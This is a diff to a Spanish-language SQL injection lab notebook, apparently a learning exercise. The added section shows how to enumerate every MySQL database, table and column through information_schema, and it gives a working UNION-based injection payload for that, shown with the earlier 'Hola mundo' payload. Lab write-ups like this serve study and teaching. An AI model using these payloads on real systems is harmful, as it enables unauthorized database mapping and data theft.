@@ -57,3 +57,20 @@ Inyección:
 999' UNION SELECT null, null, 'Hola mundo' from dual #
 ```
 ![](capturas/sql-injection-lab1-5.png)
+
+
+# Datos de todas las bases de datos, tablas y columnas de MySQL
+Consulta SQL →
+```
+select information_Schema.tables.table_schema, information_Schema.columns.table_name, information_Schema.columns.column_name FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name =
+information_Schema.columns.table_name;#
+```
+Inyección →
+```
+999' UNION select null,
+concat(information_Schema.tables.table_schema,'-->',information_Schema.columns.table_n
+ame), information_Schema.columns.column_name FROM information_Schema.columns,
+information_Schema.tables WHERE information_Schema.tables.table_name =
+information_Schema.columns.table_name;#
+```
+![](capturas/sql-injection-lab1-6.png)
